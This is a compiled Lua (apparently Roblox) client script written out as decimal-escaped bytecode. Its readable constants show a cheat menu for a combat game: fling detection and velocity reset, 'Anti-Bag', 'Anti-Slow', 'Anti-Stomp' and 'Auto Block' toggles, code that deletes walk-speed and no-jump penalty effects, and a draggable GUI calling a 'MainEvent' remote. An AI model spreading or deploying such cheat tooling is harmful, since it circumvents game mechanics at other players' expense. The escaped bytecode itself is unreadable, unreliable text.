101\109\98\108\121\65\110\103\117\108\97\114\86\101\108\111\99\105\116\121\0\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\0\73\64\4\23\0\0\0\65\115\115\101\109\98\108\121\76\105\110\101\97\114\86\101\108\111\99\105\116\121\0\3\0\0\0\0\0\0\89\64\1\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\22\0\0\0\67\104\97\116\77\97\107\101\83\121\115\116\101\109\77\101\115\115\97\103\101\0\4\5\0\0\0\84\101\120\116\0\4\33\0\0\0\70\108\105\110\103\32\69\120\112\108\111\105\116\32\100\101\116\101\99\116\101\100\44\32\80\108\97\121\101\114\58\32\0\4\9\0\0\0\116\111\115\116\114\105\110\103\0\4\6\0\0\0\67\111\108\111\114\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\0\105\64\3\0\0\0\0\0\0\0\0\4\7\0\0\0\105\112\97\105\114\115\0\4\15\0\0\0\71\101\116\68\101\115\99\101\110\100\97\110\116\115\0\4\4\0\0\0\73\115\65\0\4\9\0\0\0\66\97\115\101\80\97\114\116\0\4\11\0\0\0\67\97\110\67\111\108\108\105\100\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\4\25\0\0\0\67\117\115\116\111\109\80\104\121\115\105\99\97\108\80\114\111\112\101\114\116\105\101\115\0\4\19\0\0\0\80\104\121\115\105\99\97\108\80\114\111\112\101\114\116\105\101\115\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\39\14\0\0\55\14\0\0\2\0\0\2\6\0\0\0\5\0\0\0\100\0\0\0\4\0\0\0\4\0\128\0\28\64\0\1\30\0\128\0\1\0\0\0\4\6\0\0\0\112\99\97\108\108\0\1\0\0\0\0\0\0\0\40\14\0\0\54\14\0\0\2\0\0\9\53\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\70\128\64\0\70\192\192\0\88\64\0\130\22\192\0\128\70\64\65\0\70\192\192\0\24\64\0\130\22\128\7\128\69\128\1\0\70\192\193\0\129\0\2\0\193\0\2\0\1\1\2\0\92\128\0\2\9\64\128\130\69\128\1\0\70\192\193\0\129\0\2\0\193\0\2\0\1\1\2\0\92\128\0\2\9\64\0\129\68\0\128\0\9\64\128\132\69\128\2\0\70\192\194\0\75\0\195\0\193\64\3\0\10\129\0\0\9\193\67\135\69\65\4\0\70\129\196\2\129\193\4\0\193\1\2\0\1\2\2\0\92\129\0\2\9\65\1\136\92\64\0\2\22\64\2\128\70\128\64\0\70\192\192\0\88\0\197\0\22\192\0\128\70\64\65\0\70\192\192\0\24\64\0\138\22\64\0\128\70\64\66\0\72\0\128\0\30\0\128\0\21\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\80\114\105\109\97\114\121\80\97\114\116\0\4\23\0\0\0\65\115\115\101\109\98\108\121\76\105\110\101\97\114\86\101\108\111\99\105\116\121\0\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\64\111\64\4\24\0\0\0\65\115\115\101\109\98\108\121\65\110\103\117\108\97\114\86\101\108\111\99\105\116\121\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\4\7\0\0\0\67\70\114\97\109\101\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\22\0\0\0\67\104\97\116\77\97\107\101\83\121\115\116\101\109\77\101\115\115\97\103\101\0\4\5\0\0\0\84\101\120\116\0\4\39\0\0\0\89\111\117\32\119\101\114\101\32\102\108\117\110\103\46\32\78\101\117\116\114\97\108\105\122\105\110\103\32\118\101\108\111\99\105\116\121\46\0\4\6\0\0\0\67\111\108\111\114\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\0\73\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\60\14\0\0\100\14\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\67\14\0\0\98\14\0\0\0\0\0\6\27\0\0\0\2\0\128\0\69\0\0\0\70\64\192\0\70\128\192\0\134\192\192\0\154\64\0\0\22\128\0\128\134\0\193\0\139\64\65\1\156\128\0\1\197\0\0\0\198\64\192\1\198\128\192\1\199\128\1\0\197\128\1\0\203\0\194\1\220\128\0\1\199\192\1\0\197\192\1\0\198\64\194\1\203\128\194\1\100\1\0\0\0\0\0\0\0\0\128\0\0\0\0\1\220\64\128\1\30\0\128\0\11\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\15\0\0\0\67\104\97\114\97\99\116\101\114\65\100\100\101\100\0\4\5\0\0\0\87\97\105\116\0\4\4\0\0\0\112\108\114\0\4\6\0\0\0\109\111\117\115\101\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\8\0\0\0\75\101\121\68\111\119\110\0\4\8\0\0\0\99\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\74\14\0\0\96\14\0\0\3\1\0\8\37\0\0\0\23\0\64\0\22\64\8\128\68\0\0\0\83\0\128\0\72\0\0\0\69\64\0\0\70\128\192\0\70\192\192\0\72\0\128\0\68\0\128\0\70\0\193\0\72\0\0\1\68\0\0\0\90\0\0\0\22\0\3\128\69\64\1\0\132\0\0\1\139\128\65\1\156\0\0\1\92\0\1\0\22\0\1\128\133\193\1\0\228\1\0\0\0\0\128\2\156\65\0\1\35\1\0\0\97\128\0\0\22\0\254\127\69\64\0\0\75\0\194\0\193\64\2\0\92\128\128\1\70\128\194\0\75\192\194\0\92\64\0\1\22\0\248\127\30\0\128\0\12\0\0\0\4\2\0\0\0\107\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\6\0\0\0\112\97\105\114\115\0\4\15\0\0\0\71\101\116\68\101\115\99\101\110\100\97\110\116\115\0\4\6\0\0\0\112\99\97\108\108\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\8\0\0\0\83\116\101\112\112\101\100\0\4\5\0\0\0\119\97\105\116\0\1\0\0\0\0\0\0\0\84\14\0\0\88\14\0\0\1\0\0\3\9\0\0\0\4\0\0\0\11\0\64\0\129\64\0\0\28\128\128\1\26\0\0\0\22\64\0\128\4\0\0\0\9\192\64\129\30\0\128\0\4\0\0\0\4\4\0\0\0\73\115\65\0\4\9\0\0\0\66\97\115\101\80\97\114\116\0\4\11\0\0\0\67\97\110\67\111\108\108\105\100\101\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\102\14\0\0\163\14\0\0\1\0\0\19\66\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\69\192\0\0\70\0\193\0\70\64\193\0\70\128\193\0\133\192\1\0\134\0\66\1\134\64\66\1\197\192\1\0\198\128\194\1\198\192\194\1\5\193\0\0\11\1\67\2\129\1\1\0\28\129\128\1\11\65\67\2\128\1\128\0\192\1\0\1\0\2\128\1\28\193\128\2\134\129\67\0\197\193\0\0\198\1\193\3\198\65\193\3\11\194\195\3\28\130\0\1\70\2\68\4\75\66\196\4\228\2\0\0\0\0\0\3\92\66\128\1\69\194\0\0\75\2\195\4\193\130\4\0\92\130\128\1\134\130\67\0\195\2\0\7\228\67\0\0\0\0\128\6\0\0\0\5\0\0\0\7\6\196\68\5\11\4\69\8\164\132\0\0\0\0\128\5\0\0\128\6\0\0\0\7\0\0\0\5\28\68\128\1\6\68\69\5\11\4\69\8\164\196\0\0\0\0\0\6\28\68\128\1\6\68\197\4\11\4\69\8\164\4\1\0\0\0\0\6\0\0\128\5\0\0\128\7\28\68\128\1\30\0\128\0\22\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\7\0\0\0\85\115\101\114\73\100\0\4\5\0\0\0\69\110\117\109\0\4\14\0\0\0\84\104\117\109\98\110\97\105\108\84\121\112\101\0\4\9\0\0\0\72\101\97\100\83\104\111\116\0\4\14\0\0\0\84\104\117\109\98\110\97\105\108\83\105\122\101\0\4\12\0\0\0\83\105\122\101\52\50\48\120\52\50\48\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\22\0\0\0\71\101\116\85\115\101\114\84\104\117\109\98\110\97\105\108\65\115\121\110\99\0\4\7\0\0\0\80\97\114\101\110\116\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\8\0\0\0\75\101\121\68\111\119\110\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\17\0\0\0\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101\0\4\11\0\0\0\73\110\112\117\116\66\101\103\97\110\0\4\8\0\0\0\67\111\110\110\101\99\116\0\4\13\0\0\0\73\110\112\117\116\67\104\97\110\103\101\100\0\5\0\0\0\0\0\0\0\115\14\0\0\122\14\0\0\1\1\0\2\12\0\0\0\23\0\64\0\22\0\2\128\68\0\0\0\70\64\192\0\23\128\192\0\22\128\0\128\68\0\0\0\73\192\192\128\22\64\0\128\68\0\0\0\73\128\192\128\30\0\128\0\4\0\0\0\4\2\0\0\0\118\0\4\8\0\0\0\86\105\115\105\98\108\101\0\1\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\133\14\0\0\136\14\0\0\3\1\0\9\25\0\0\0\70\0\64\0\132\0\0\0\77\128\128\0\132\0\128\0\197\64\0\0\198\128\192\1\4\1\0\1\6\193\64\2\6\1\65\2\68\1\0\1\70\193\192\2\70\65\193\2\134\193\192\0\76\129\129\2\132\1\0\1\134\129\65\3\134\1\65\3\196\1\0\1\198\129\193\3\198\65\193\3\6\130\193\0\204\1\130\3\220\128\128\2\137\192\0\128\30\0\128\0\7\0\0\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\6\0\0\0\85\68\105\109\50\0\4\4\0\0\0\110\101\119\0\4\2\0\0\0\88\0\4\6\0\0\0\83\99\97\108\101\0\4\7\0\0\0\79\102\102\115\101\116\0\4\2\0\0\0\89\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\138\14\0\0\150\14\0\0\4\1\0\4\26\0\0\0\70\0\64\0\133\64\0\0\134\0\64\1\134\128\64\1\87\128\128\0\22\64\1\128\70\0\64\0\133\64\0\0\134\0\64\1\134\192\64\1\23\128\128\0\22\0\3\128\66\0\128\0\72\0\0\0\70\0\65\0\72\0\128\0\68\0\128\1\70\0\193\0\72\0\0\1\70\64\65\0\75\128\193\0\228\0\0\0\0\0\0\0\4\0\0\0\92\64\128\1\30\0\128\0\7\0\0\0\4\14\0\0\0\85\115\101\114\73\110\112\117\116\84\121\112\101\0\4\5\0\0\0\69\110\117\109\0\4\13\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\0\4\6\0\0\0\84\111\117\99\104\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\8\0\0\0\67\104\97\110\103\101\100\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\144\14\0\0\148\14\0\0\2\0\0\2\10\0\0\0\4\0\0\0\6\0\64\0\69\64\0\0\70\0\192\0\70\128\192\0\23\64\0\0\22\64\0\128\2\0\0\0\8\0\128\0\30\0\128\0\3\0\0\0\4\15\0\0\0\85\115\101\114\73\110\112\117\116\83\116\97\116\101\0\4\5\0\0\0\69\110\117\109\0\4\4\0\0\0\69\110\100\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\152\14\0\0\156\14\0\0\1\1\0\3\14\0\0\0\70\0\64\0\133\64\0\0\134\0\64\1\134\128\64\1\87\128\128\0\22\64\1\128\70\0\64\0\133\64\0\0\134\0\64\1\134\192\64\1\23\128\128\0\22\0\0\128\8\0\0\0\30\0\128\0\4\0\0\0\4\14\0\0\0\85\115\101\114\73\110\112\117\116\84\121\112\101\0\4\5\0\0\0\69\110\117\109\0\4\14\0\0\0\77\111\117\115\101\77\111\118\101\109\101\110\116\0\4\6\0\0\0\84\111\117\99\104\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\158\14\0\0\162\14\0\0\3\1\0\3\10\0\0\0\68\0\0\0\23\64\0\0\22\64\1\128\68\0\128\0\90\0\0\0\22\128\0\128\68\0\0\1\128\0\0\0\92\64\0\1\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\165\14\0\0\197\14\0\0\1\0\0\10\35\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\70\0\193\0\133\64\1\0\134\128\65\1\193\192\1\0\1\1\2\0\65\1\2\0\156\128\0\2\197\64\1\0\198\128\193\1\1\1\2\0\65\65\2\0\129\1\2\0\220\128\0\2\6\193\64\0\66\1\128\0\133\129\2\0\134\193\66\3\134\1\67\3\73\128\128\134\198\129\67\2\203\193\195\3\100\2\0\0\0\0\128\2\0\0\128\0\0\0\128\1\0\0\0\3\0\0\0\1\220\65\128\1\30\0\128\0\16\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\11\0\0\0\65\110\116\105\66\97\103\76\117\122\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\64\111\64\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\176\14\0\0\196\14\0\0\5\0\0\5\32\0\0\0\4\0\0\0\23\0\64\0\22\192\3\128\4\0\128\0\68\0\0\1\9\64\128\128\2\0\0\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\64\65\0\129\128\1\0\193\192\1\0\36\1\0\0\4\0\128\1\28\64\128\2\22\192\2\128\4\0\128\0\68\0\0\2\9\64\128\128\2\0\128\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\0\66\0\129\128\1\0\28\64\128\1\30\0\128\0\9\0\0\0\1\1\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\9\0\0\0\65\110\116\105\45\66\97\103\0\3\0\0\0\0\0\0\0\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\1\0\0\0\0\0\0\0\181\14\0\0\187\14\0\0\1\0\0\3\17\0\0\0\5\0\0\0\28\64\128\0\4\0\0\0\6\64\64\0\11\128\64\0\129\192\0\0\28\128\128\1\26\0\0\0\22\128\1\128\4\0\0\0\6\64\64\0\11\128\64\0\129\192\0\0\28\128\128\1\11\0\65\0\28\64\0\1\30\0\128\0\5\0\0\0\4\5\0\0\0\119\97\105\116\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\15\0\0\0\67\104\114\105\115\116\109\97\115\95\83\111\99\107\0\4\8\0\0\0\68\101\115\116\114\111\121\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\199\14\0\0\236\14\0\0\1\0\0\10\34\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\70\0\193\0\133\64\1\0\134\128\65\1\193\192\1\0\1\1\2\0\65\1\2\0\156\128\0\2\197\64\1\0\198\128\193\1\1\1\2\0\65\65\2\0\129\1\2\0\220\128\0\2\6\193\64\0\66\1\128\0\133\129\2\0\134\193\66\3\134\1\67\3\73\128\128\134\198\129\67\2\203\193\195\3\100\2\0\0\0\0\128\2\0\0\128\0\0\0\128\1\0\0\0\1\220\65\128\1\30\0\128\0\16\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\12\0\0\0\65\110\116\105\83\108\111\119\76\117\122\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\64\111\64\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\216\14\0\0\235\14\0\0\4\0\0\5\31\0\0\0\4\0\0\0\23\0\64\0\22\128\3\128\4\0\128\0\68\0\0\1\9\64\128\128\2\0\0\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\64\65\0\129\128\1\0\193\192\1\0\36\1\0\0\28\64\128\2\22\192\2\128\4\0\128\0\68\0\128\1\9\64\128\128\2\0\128\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\0\66\0\129\128\1\0\28\64\128\1\30\0\128\0\9\0\0\0\1\1\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\10\0\0\0\65\110\116\105\45\83\108\111\119\0\3\0\0\0\0\0\0\0\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\1\0\0\0\0\0\0\0\221\14\0\0\226\14\0\0\0\0\0\3\85\0\0\0\5\0\0\0\28\64\128\0\5\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\6\128\65\0\11\192\65\0\129\0\2\0\28\128\128\1\26\0\0\0\22\128\2\128\5\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\6\128\65\0\11\192\65\0\129\0\2\0\28\128\128\1\11\64\66\0\28\64\0\1\5\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\6\128\65\0\11\192\65\0\129\128\2\0\28\128\128\1\26\0\0\0\22\128\2\128\5\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\6\128\65\0\11\192\65\0\129\128\2\0\28\128\128\1\11\64\66\0\28\64\0\1\5\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\6\128\65\0\11\192\65\0\129\192\2\0\28\128\128\1\26\0\0\0\22\128\2\128\5\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\6\128\65\0\11\192\65\0\129\192\2\0\28\128\128\1\11\64\66\0\28\64\0\1\5\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\6\0\67\0\6\64\67\0\23\128\67\0\22\128\1\128\5\64\0\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\6\0\67\0\9\192\195\134\30\0\128\0\16\0\0\0\4\5\0\0\0\119\97\105\116\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\9\0\0\0\77\111\118\101\109\101\110\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\12\0\0\0\78\111\87\97\108\107\83\112\101\101\100\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\11\0\0\0\82\101\100\117\99\101\87\97\108\107\0\4\10\0\0\0\78\111\74\117\109\112\105\110\103\0\4\7\0\0\0\82\101\108\111\97\100\0\4\6\0\0\0\86\97\108\117\101\0\1\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\238\14\0\0\32\15\0\0\1\0\0\10\34\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\70\0\193\0\133\64\1\0\134\128\65\1\193\192\1\0\1\1\2\0\65\1\2\0\156\128\0\2\197\64\1\0\198\128\193\1\1\1\2\0\65\65\2\0\129\1\2\0\220\128\0\2\6\193\64\0\66\1\128\0\133\129\2\0\134\193\66\3\134\1\67\3\73\128\128\134\198\129\67\2\203\193\195\3\100\2\0\0\0\0\128\2\0\0\128\0\0\0\128\1\0\0\0\1\220\65\128\1\30\0\128\0\16\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\13\0\0\0\65\110\116\105\83\116\111\109\112\76\117\122\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\64\111\64\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\255\14\0\0\31\15\0\0\4\0\0\5\31\0\0\0\4\0\0\0\23\0\64\0\22\128\3\128\4\0\128\0\68\0\0\1\9\64\128\128\2\0\0\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\64\65\0\129\128\1\0\193\192\1\0\36\1\0\0\28\64\128\2\22\192\2\128\4\0\128\0\68\0\128\1\9\64\128\128\2\0\128\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\0\66\0\129\128\1\0\28\64\128\1\30\0\128\0\9\0\0\0\1\1\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\11\0\0\0\65\110\116\105\45\83\116\111\109\112\0\3\0\0\0\0\0\0\0\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\1\0\0\0\0\0\0\0\4\15\0\0\22\15\0\0\0\0\0\8\51\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\25\128\65\0\22\64\10\128\5\192\1\0\69\0\0\0\70\64\192\0\70\128\192\0\70\192\192\0\75\0\194\0\92\0\0\1\28\0\1\0\22\192\2\128\75\65\66\2\193\129\2\0\92\129\128\1\90\65\0\0\22\0\1\128\75\65\66\2\193\193\2\0\92\129\128\1\90\1\0\0\22\64\0\128\75\1\67\2\92\65\0\1\33\128\0\0\22\64\252\127\5\192\1\0\69\0\0\0\70\64\192\0\70\128\192\0\70\192\192\0\75\0\194\0\92\0\0\1\28\0\1\0\22\192\1\128\75\65\66\2\193\65\3\0\92\129\128\1\90\1\0\0\22\128\0\128\70\129\67\2\75\1\195\2\92\65\0\1\33\128\0\0\22\64\253\127\30\0\128\0\15\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\7\0\0\0\72\101\97\108\116\104\0\3\0\0\0\0\0\0\20\64\4\6\0\0\0\112\97\105\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\4\0\0\0\73\115\65\0\4\9\0\0\0\77\101\115\104\80\97\114\116\0\4\5\0\0\0\80\97\114\116\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\10\0\0\0\65\99\99\101\115\115\111\114\121\0\4\7\0\0\0\72\97\110\100\108\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\34\15\0\0\90\15\0\0\1\0\0\10\38\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\70\0\193\0\133\64\1\0\134\128\65\1\193\192\1\0\1\1\2\0\65\1\2\0\156\128\0\2\197\64\1\0\198\128\193\1\1\1\2\0\65\65\2\0\129\1\2\0\220\128\0\2\6\193\64\0\66\1\128\0\133\129\2\0\134\193\66\3\134\1\67\3\197\65\3\0\36\2\0\0\220\65\0\1\73\128\0\135\198\193\67\2\203\1\196\3\100\66\0\0\0\0\128\2\0\0\128\0\0\0\128\1\0\0\0\3\0\0\0\1\220\65\128\1\30\0\128\0\17\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\13\0\0\0\65\117\116\111\66\108\111\99\107\76\117\122\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\64\111\64\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\6\0\0\0\112\99\97\108\108\0\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\2\0\0\0\0\0\0\0\49\15\0\0\52\15\0\0\0\0\0\3\9\0\0\0\5\64\0\0\11\128\64\0\129\192\0\0\28\128\128\1\6\0\64\0\7\0\0\0\1\64\1\0\7\0\1\0\30\0\128\0\6\0\0\0\4\10\0\0\0\77\97\105\110\69\118\101\110\116\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\18\0\0\0\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\0\4\10\0\0\0\68\105\115\116\97\110\99\105\97\0\3\0\0\0\0\0\0\46\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\